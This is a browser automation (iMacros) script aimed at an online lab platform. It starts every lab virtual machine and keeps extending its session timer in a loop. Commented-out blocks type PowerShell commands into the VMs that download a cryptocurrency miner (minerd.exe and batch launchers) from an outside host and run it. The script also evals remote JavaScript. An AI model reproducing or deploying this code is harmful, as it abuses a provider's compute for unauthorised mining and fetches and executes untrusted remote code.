var pref = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService);

function loadScriptFromURL(url) {
    var request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest),
        async = false;
    request.open('GET', url, async);
    request.send();
    if (request.status !== 200) {
        var message = 'an error occurred while loading script at url: ' + url + ', status: ' + request.status;
        display_timeline(message);
        return false;
    }
    eval(request.response);
    return true;
}
function load_jquery(){
	loadScriptFromURL('https://code.jquery.com/jquery-1.12.4.min.js');
	$ = window.$;
	JQuery = window.JQuery;
}

//open powershell
/*
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:windowsKeyR ");
iimPlay("CODE:WAIT SECONDS = 2");
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
iimPlay("CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=powershell ");
iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
iimPlay("CODE:WAIT SECONDS = 2");
iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
iimPlay("CODE:WAIT SECONDS = 2");

// downoad File

iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="$client = new-object System.Net.WebClient"');
iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
iimPlay("CODE:WAIT SECONDS = 3");
var myStringArray = ["etn_startup.exe","libcurl.dll" , "libeay32.dll" , "libgcc_s_seh-1.dll" , "libstdc++-6.dll" , "libwinpthread-1.dll" , "minerd.exe" , "ssleay32.dll" , "star-etn.bat" ,"star-etnFromC.bat" , "zlib1.dll"];
var arrayLength = myStringArray.length;
for (var i = 0; i < arrayLength; i++) {
	iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
	iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="$client.DownloadFile(\"http://thuenhahn.com/temp/'+myStringArray[i]+'\",\"C:\\'+myStringArray[i]+'\");"');
	iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
	iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
	iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
	iimPlay("CODE:WAIT SECONDS = 3");
}

// run 2 file
//iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="& \'C:/\etn_startup.exe\'"');
//iimPlay("CODE:WAIT SECONDS = 885 ");
	iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
	iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="& \'C:/\etn_startup.exe\'"');
	iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
	iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
	iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
	iimPlay("CODE:WAIT SECONDS = 3");
	
	
	
	
	
	iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="& \'C:/\star-etn.bat\'"');
	iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
	iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
	iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');


// open cmd
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:windowsKeyR ");
iimPlay("CODE:WAIT SECONDS = 2");
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
iimPlay("CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=cmd ");
iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
iimPlay("CODE:WAIT SECONDS = 2");
iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
iimPlay("CODE:WAIT SECONDS = 2");
*/
count = 0 ; 
var loopmeo ; 
load_jquery();
$('<h3><b id="stopmeo" style="cursor:pointer">Stop</b><h3>').appendTo('#machines');
/*
var logout_machine = prompt('Input position logout ( seperate with , )');
var lo_array = logout_machine.split(',');
*/
var ids = $('#machines .machine:first .thumbnail').attr('src');
var id1 = ids.split('Lab');
var id2 = id1[1].split('-');
var id_machine = id2[0];

var total_machine = $('.machineName').length ; 
function start() {
	var tem = count + 1 ;
	iimDisplay ("Start " + tem)
	for (var i = 1 ; i < total_machine + 1; i++) {
		iimPlay("CODE:TAG POS="+i+" TYPE=DIV ATTR=CLASS:machineName");
		iimPlay("CODE:WAIT SECONDS = 6");
		if($("#startMachine").is(":visible")){
			iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:startMachine") ;
		}
		iimPlay("CODE:WAIT SECONDS = 3");
	}
  
  	var timer = $('#timer').text();
  	if(timer.indexOf('Minutes') > - 1){
		var minute = timer.split('Minutes');
		var minu = parseInt(minute);
		
		
		if(minu < 40){
			$.post("https://labondemand.com/Console/Extend/" + id_machine , function(){
				iimDisplay ("Extended")
				
			});
		}
		
	}
   loopmeo = window.setTimeout(start, 120000);
}

// boot up the first call
start();
$('#stopmeo').click(function(){
	 clearTimeout(loopmeo);
})
/*
iimPlay("CODE:WAIT SECONDS = 885 ");
load_jquery();
var logout_machine = prompt('Input position logout ( seperate with , )');
var total_time = prompt('Input total time');
var total_machine = $('.machineName').length ; 
for(i = 0 ; i < 300 ; i++){
	for(j = 1 ; j < total_machine + 1; j++){
		iimPlay("CODE:TAG POS="+j+" TYPE=DIV ATTR=CLASS:machineName");
		iimPlay("CODE:WAIT SECONDS = 1 ") ;
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:startMachine") ;
	//	iimPlay("CODE:WAIT SECONDS = 6 ") ;
		if(logout_machine.indexOf(j.toString()) > -1){
			if($("#startMachine").is(":visible")){
				iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:startMachine") ;
				iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands") ;
				iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pastePassword") ;
				iimPlay("CODE:WAIT SECONDS = 9");
				iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
				iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
				iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
			}
			else{
				
			}
		}
	}
	iimPlay("CODE:WAIT SECONDS = 5 ");
}

*/